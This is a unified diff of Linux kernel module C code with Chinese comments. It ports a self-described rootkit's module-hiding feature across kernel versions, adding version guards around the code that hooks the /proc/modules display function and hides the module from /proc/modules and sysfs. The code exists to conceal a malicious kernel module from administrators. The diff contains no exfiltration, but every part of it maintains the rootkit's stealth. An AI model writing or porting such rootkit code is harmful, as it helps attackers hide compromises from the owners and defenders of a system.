@@ -8,15 +8,19 @@
 // 外部变量声明
 extern struct list_head *module_previous;
 extern short module_hidden;
-extern struct module *THIS_MODULE;
+// THIS_MODULE已在内核头文件中定义，无需重复声明
 
-// 原始函数指针
+// 原始函数指针（仅在旧内核版本中使用）
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int (*original_proc_modules_show)(struct seq_file *m, void *v);
 static struct file_operations *original_proc_modules_fops;
+#endif
 
 // 模块隐藏相关函数
 static int is_hidden_module(const char *name);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int hooked_proc_modules_show(struct seq_file *m, void *v);
+#endif
 static void hide_from_proc_modules(void);
 static void restore_proc_modules(void);
 static void hide_from_sysfs(void);
@@ -47,7 +51,8 @@ static int is_hidden_module(const char *name) {
     return 0;
 }
 
-// Hook /proc/modules 显示函数
+// Hook /proc/modules 显示函数（仅在旧内核版本中使用）
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int hooked_proc_modules_show(struct seq_file *m, void *v) {
     struct module *mod = list_entry(v, struct module, list);
     
@@ -59,12 +64,14 @@ static int hooked_proc_modules_show(struct seq_file *m, void *v) {
     // 调用原始显示函数
     return original_proc_modules_show(m, v);
 }
+#endif
 
 // 从 /proc/modules 中隐藏
 static void hide_from_proc_modules(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
     struct proc_dir_entry *proc_modules;
     
-    // 查找 /proc/modules 条目
+    // 在较老的内核版本中使用proc_find_entry
     proc_modules = proc_find_entry("modules", NULL);
     if (!proc_modules) {
         printk(KERN_WARNING "[rootkit] Cannot find /proc/modules entry\n");
@@ -78,10 +85,16 @@ static void hide_from_proc_modules(void) {
     // 由于内核版本差异，这部分需要根据具体内核调整
     
     printk(KERN_INFO "[rootkit] Hooked /proc/modules\n");
+#else
+    // 在较新的内核版本中，proc_find_entry不再导出
+    // 使用替代方法或跳过此功能
+    printk(KERN_WARNING "[rootkit] /proc/modules hooking not supported in this kernel version\n");
+#endif
 }
 
 // 恢复 /proc/modules
 static void restore_proc_modules(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
     struct proc_dir_entry *proc_modules;
     
     if (!original_proc_modules_fops) {
@@ -93,6 +106,10 @@ static void restore_proc_modules(void) {
         proc_modules->proc_fops = original_proc_modules_fops;
         printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
     }
+#else
+    // 在较新的内核版本中无需恢复
+    printk(KERN_INFO "[rootkit] /proc/modules restore not needed in this kernel version\n");
+#endif
 }
 
 // 从 sysfs 中隐藏
